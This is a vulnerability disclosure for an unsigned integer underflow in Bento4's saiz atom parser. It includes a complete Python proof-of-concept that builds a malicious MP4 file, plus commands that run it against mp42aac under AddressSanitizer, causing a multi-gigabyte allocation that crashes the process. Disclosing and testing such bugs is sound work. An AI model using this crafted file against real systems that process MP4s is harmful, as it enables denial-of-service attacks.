## Bug0: AP4_SaizAtom unsigned integer underflow bypasses entry-count bounds check

In `AP4_SaizAtom::AP4_SaizAtom()` in `Ap4SaizAtom.cpp`, the `remains` counter underflows to 0xFFFFFFFB when `size=20` and `flags=0x000001` because the unconditional `remains -= 5` executes after both the optional 8-byte auxiliary-field subtraction and a cross-boundary stream read have already consumed all available bytes, rendering the subsequent `m_SampleCount > remains` sanity check ineffective and allowing an attacker-controlled sample count of up to ~4 GB to be passed unchecked into `new AP4_UI08[m_SampleCount]`, causing a denial-of-service crash.

### PoC

Craft a malicious MP4 file using the Python script below and process it with the ASAN-instrumented mp42aac binary to trigger the vulnerability.

```python
#!/usr/bin/env python3
import struct

def box(btype, data=b''):
    return struct.pack('>I', 8 + len(data)) + btype + data

def fullbox(btype, version, flags, data=b''):
    return box(btype, struct.pack('>I', ((version & 0xFF) << 24) | (flags & 0xFFFFFF)) + data)

stsd = fullbox(b'stsd', 0, 0, struct.pack('>I', 0))
stts = fullbox(b'stts', 0, 0, struct.pack('>I', 0))
stsc = fullbox(b'stsc', 0, 0, struct.pack('>I', 0))
stsz = fullbox(b'stsz', 0, 0, struct.pack('>II', 0, 0))
stco = fullbox(b'stco', 0, 0, struct.pack('>I', 0))

# Crafted saiz: size=20, version=0, flags=0x000001
# header: size(4)+type(4)+version(1)+flags(3) = 12 bytes
# body:   aux_info_type(4)=0 + aux_info_type_parameter(4)=0 = 8 bytes
# After reading 8-byte body: remains=0, then remains-=5 → 0xFFFFFFFB (underflow)
saiz  = struct.pack('>I', 20) + b'saiz'
saiz += b'\x00' + struct.pack('>I', 0x000001)[1:]  # version=0, flags=0x000001
saiz += struct.pack('>II', 0, 0)                    # aux_info_type=0, aux_info_type_parameter=0
assert len(saiz) == 20

# 'free' box placed immediately after saiz.
# saiz constructor reads 5 bytes cross-boundary from this box's header:
#   byte 0 of free header → m_DefaultSampleInfoSize = 0x00  (triggers allocation branch)
#   bytes 1-4 of free header → m_SampleCount = 0xFF000066 = 4,278,190,182 (~4 GB)
# free size = 0x00FF0000 encodes the desired bytes: 0x00, 0xFF, 0x00, 0x00
# free type = b'free', first byte 0x66 ('f') → sample_count = 0xFF000066
FREE_SIZE = 0x00FF0000
free_hdr = struct.pack('>I', FREE_SIZE) + b'free'  # 8 bytes

stbl_data = stsd + stts + stsc + stsz + stco + saiz + free_hdr
stbl = box(b'stbl', stbl_data)

smhd = fullbox(b'smhd', 0, 0, struct.pack('>HH', 0, 0))
url_ = fullbox(b'url ', 0, 1, b'')
dref = fullbox(b'dref', 0, 0, struct.pack('>I', 1) + url_)
dinf = box(b'dinf', dref)
minf = box(b'minf', smhd + dinf + stbl)

mdhd = fullbox(b'mdhd', 0, 0, struct.pack('>IIIII', 0, 0, 44100, 0, 0x15c70000))
hdlr_name = b'Sound Handler\x00'
hdlr = fullbox(b'hdlr', 0, 0, struct.pack('>I', 0) + b'soun' + b'\x00' * 12 + hdlr_name)
mdia = box(b'mdia', mdhd + hdlr + minf)

matrix = struct.pack('>9i',
    0x00010000, 0, 0,
    0, 0x00010000, 0,
    0, 0, 0x40000000)
tkhd = fullbox(b'tkhd', 0, 3,
    struct.pack('>IIIII', 0, 0, 1, 0, 0) +
    struct.pack('>II', 0, 0) +
    struct.pack('>hh', 0, 0) +
    struct.pack('>HH', 0x0100, 0) +
    matrix +
    struct.pack('>II', 0, 0))
trak = box(b'trak', tkhd + mdia)

mvhd = fullbox(b'mvhd', 0, 0,
    struct.pack('>IIIII', 0, 0, 1000, 0, 0x00010000) +
    struct.pack('>HH', 0x0100, 0) +
    b'\x00' * 10 +
    matrix +
    b'\x00' * 24 +
    struct.pack('>I', 2))
moov = box(b'moov', mvhd + trak)

ftyp = box(b'ftyp', b'mp42' + struct.pack('>I', 0) + b'mp42' + b'isom')
mp4 = ftyp + moov

with open('poc_input.mp4', 'wb') as f:
    f.write(mp4)
print(f"[+] Written {len(mp4)} bytes to poc_input.mp4")
print("[+] saiz atom: size=20, flags=0x000001, 8-byte body fully consumed by aux fields")
print("[+] Cross-boundary read: free-box header bytes → sample_count=0xFF000066 (~4 GB)")
```

```bash
python3 gen.py
ASAN_OPTIONS="abort_on_error=0:log_path=./asan.log" /data/ylwang/non-textfuzz/target/Bento4/build_test/bin/mp42aac poc_input.mp4 /dev/null || true
for f in ./asan.log.*; do grep -E "AddressSanitizer|ERROR:|runtime error:" "$f" || true; done
```

**Result:** AddressSanitizer: hard rss limit exhausted (8192Mb vs 8198Mb)
Cause: AP4_SaizAtom constructor with size=20 and flags=0x000001 causes remains to underflow to 0xFFFFFFFB, the sample-count sanity check is bypassed, m_SampleCount=0xFF000066 (~4 GB), and the resulting new[] allocation exhausts the RSS limit triggering an ASAN fatal abort with exit code 1.
Stack frame 0: AP4_SaizAtom::AP4_SaizAtom (Ap4SaizAtom.cpp:89)
Stack frame 1: AP4_SaizAtom::Create (Ap4SaizAtom.cpp:62)

### Impact

An attacker who can supply a crafted MP4 file to any mp42aac invocation can trigger an uncontrolled ~4 GB heap allocation through the unsigned integer underflow in AP4_SaizAtom, causing process termination via std::bad_alloc or ASAN RSS limit exhaustion and achieving a reliable denial of service. The same underflow additionally causes the constructor to read five bytes across the declared atom boundary from an adjacent atom, allowing an attacker who controls the file layout to inject arbitrary values for `m_DefaultSampleInfoSize` and `m_SampleCount`, which could lead to data confusion or further memory-safety violations in downstream processing. No special privileges are required because the vulnerable path is reached whenever mp42aac parses a moov box containing a saiz atom with the auxiliary-info flag set.
